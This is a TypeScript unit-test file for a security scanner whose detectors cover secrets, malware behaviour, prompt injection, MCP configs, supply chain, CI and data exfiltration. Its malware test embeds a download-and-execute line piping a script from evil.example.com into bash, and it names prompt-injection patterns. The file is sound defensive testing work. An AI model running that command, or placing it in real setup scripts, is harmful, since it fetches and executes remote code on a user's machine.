/**
 * Unit & Integration Tests: Specialist Detectors across all 10 Categories
 */

import { describe, it, expect } from "vitest";
import fs from "fs";
import path from "path";
import { LocalArtifactAdapter } from "@/lib/analysis/adapters/local-artifact-adapter";
import { SecretExposureDetector } from "@/lib/analysis/detectors/secret-exposure";
import { VulnerableCodeDetector } from "@/lib/analysis/detectors/vulnerable-code";
import { MalwareBehaviorDetector } from "@/lib/analysis/detectors/malware-behavior";
import { PromptInjectionDetector } from "@/lib/analysis/detectors/prompt-injection";
import { ExcessiveAgencyDetector } from "@/lib/analysis/detectors/excessive-agency";
import { McpSecurityDetector } from "@/lib/analysis/detectors/mcp-security";
import { SupplyChainDetector } from "@/lib/analysis/detectors/supply-chain";
import { InfrastructureRiskDetector } from "@/lib/analysis/detectors/infrastructure-risk";
import { DocumentRiskDetector } from "@/lib/analysis/detectors/document-risk";
import { DataExposureDetector } from "@/lib/analysis/detectors/data-exposure";

const FIXTURES_DIR = path.join(__dirname, "fixtures");

function loadFixture(filename: string): string {
  return fs.readFileSync(path.join(FIXTURES_DIR, filename), "utf-8");
}

describe("Specialist Detectors (10 Categories)", () => {
  // Category 1: Secret Exposure
  describe("Category 1: SecretExposureDetector", () => {
    const detector = new SecretExposureDetector();

    it("detects synthetic secrets in fixture 02", async () => {
      const content = loadFixture("02_synthetic_secret.env");
      const artifact = LocalArtifactAdapter.fromSingleFile(".env", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(3);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("openai_api_key");
      expect(subcategories).toContain("aws_access_key");
      expect(subcategories).toContain("github_pat");
    });

    it("produces 0 findings on benign source code (01)", async () => {
      const content = loadFixture("01_benign_source.ts");
      const artifact = LocalArtifactAdapter.fromSingleFile("utils.ts", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(0);
    });
  });

  // Category 2: Vulnerable Source Code
  describe("Category 2: VulnerableCodeDetector", () => {
    const detector = new VulnerableCodeDetector();

    it("detects dangerous command execution and eval in fixture 03", async () => {
      const content = loadFixture("03_dangerous_command.js");
      const artifact = LocalArtifactAdapter.fromSingleFile("server.js", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(2);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("dangerous_command_exec");
      expect(subcategories).toContain("unsafe_dynamic_eval");
    });

    it("produces 0 findings on benign source code (01)", async () => {
      const content = loadFixture("01_benign_source.ts");
      const artifact = LocalArtifactAdapter.fromSingleFile("utils.ts", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(0);
    });
  });

  // Category 3: Malware and Suspicious Behavior
  describe("Category 3: MalwareBehaviorDetector", () => {
    const detector = new MalwareBehaviorDetector();

    it("flags download-and-execute cradle as heuristic/suspected", async () => {
      const script = `#!/bin/bash\ncurl -s https://evil.example.com/payload.sh | bash\n`;
      const artifact = LocalArtifactAdapter.fromSingleFile("setup.sh", script);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(1);
      expect(result.findings[0].subcategory).toBe("download_exec_cradle");
      expect(result.findings[0].status).toBe("suspected"); // Heuristic limitation
    });
  });

  // Category 4: Prompt Injection
  describe("Category 4: PromptInjectionDetector", () => {
    const detector = new PromptInjectionDetector();

    it("detects instruction override and prompt extraction in fixture 04", async () => {
      const content = loadFixture("04_prompt_override.txt");
      const artifact = LocalArtifactAdapter.fromSingleFile("prompt.txt", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(2);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("instruction_override");
      expect(subcategories).toContain("prompt_extraction");
    });

    it("produces 0 findings on benign documentation", async () => {
      const content = loadFixture("benign_document.md");
      const artifact = LocalArtifactAdapter.fromSingleFile("README.md", content);
      const result = await detector.scan(artifact);

      expect(result.findings.length).toBe(0);
    });
  });

  // Category 5: Excessive Agency
  describe("Category 5: ExcessiveAgencyDetector", () => {
    const detector = new ExcessiveAgencyDetector();

    it("flags wildcard tool permissions in fixture 05", async () => {
      const content = loadFixture("05_mcp_excessive_perms.json");
      const artifact = LocalArtifactAdapter.fromSingleFile("agent_config.json", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("wildcard_tool_permissions");
    });
  });

  // Category 6: MCP Configuration Security
  describe("Category 6: McpSecurityDetector", () => {
    const detector = new McpSecurityDetector();

    it("flags dangerous bash command, --no-sandbox flag, and env secrets in fixture 05", async () => {
      const content = loadFixture("05_mcp_excessive_perms.json");
      const artifact = LocalArtifactAdapter.fromSingleFile("claude_desktop_config.json", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(3);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("dangerous_mcp_command");
      expect(subcategories).toContain("unsafe_mcp_launch_arg");
      expect(subcategories).toContain("hardcoded_mcp_env_secret");
    });

    it("passes cleanly on benign MCP config", async () => {
      const content = loadFixture("benign_mcp_config.json");
      const artifact = LocalArtifactAdapter.fromSingleFile("mcp-config.json", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(0);
    });
  });

  // Category 7: Dependency and Supply-Chain Risk
  describe("Category 7: SupplyChainDetector", () => {
    const detector = new SupplyChainDetector();

    it("detects known vulnerable dependencies from offline advisory DB and risky hooks in fixture 07", async () => {
      const content = loadFixture("07_vulnerable_manifest.json");
      const artifact = LocalArtifactAdapter.fromSingleFile("package.json", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(2);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("known_vulnerable_dependency");
      expect(subcategories).toContain("risky_lifecycle_script");

      // Verify offline advisory details
      const cveFinding = result.findings.find((f) => f.subcategory === "known_vulnerable_dependency");
      expect(cveFinding?.detectionMethod).toBe("offline_database");
      expect(cveFinding?.status).toBe("confirmed");
    });

    it("passes cleanly on benign manifest", async () => {
      const content = loadFixture("benign_manifest.json");
      const artifact = LocalArtifactAdapter.fromSingleFile("package.json", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(0);
    });
  });

  // Category 8: Infrastructure and CI Configuration
  describe("Category 8: InfrastructureRiskDetector", () => {
    const detector = new InfrastructureRiskDetector();

    it("detects privileged container and dangerous CI permissions in fixture 06", async () => {
      const content = loadFixture("06_insecure_ci_container.yml");
      const artifact = LocalArtifactAdapter.fromSingleFile(".github/workflows/ci.yml", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(2);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("privileged_container");
      expect(subcategories).toContain("ci_write_all_permissions");
    });

    it("passes cleanly on benign CI workflow", async () => {
      const content = loadFixture("benign_ci_workflow.yml");
      const artifact = LocalArtifactAdapter.fromSingleFile(".github/workflows/ci.yml", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(0);
    });
  });

  // Category 9: Document and Link Risk
  describe("Category 9: DocumentRiskDetector", () => {
    const detector = new DocumentRiskDetector();

    it("detects raw IP link and macro indicator in fixture 08", async () => {
      const content = loadFixture("08_suspicious_document.md");
      const artifact = LocalArtifactAdapter.fromSingleFile("migration.md", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(2);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("raw_ip_link_destination");
      expect(subcategories).toContain("embedded_macro_indicator");
    });

    it("passes cleanly on benign document", async () => {
      const content = loadFixture("benign_document.md");
      const artifact = LocalArtifactAdapter.fromSingleFile("guide.md", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBe(0);
    });
  });

  // Category 10: Data Exposure and Exfiltration
  describe("Category 10: DataExposureDetector", () => {
    const detector = new DataExposureDetector();

    it("detects sensitive logging and exfiltration webhook in fixture 09", async () => {
      const content = loadFixture("09_multi_finding_file.py");
      const artifact = LocalArtifactAdapter.fromSingleFile("handler.py", content);
      const result = await detector.scan(artifact);

      expect(result.status).toBe("success");
      expect(result.findings.length).toBeGreaterThanOrEqual(2);

      const subcategories = result.findings.map((f) => f.subcategory);
      expect(subcategories).toContain("sensitive_data_logging");
      expect(subcategories).toContain("suspicious_exfiltration_endpoint");
    });
  });
});
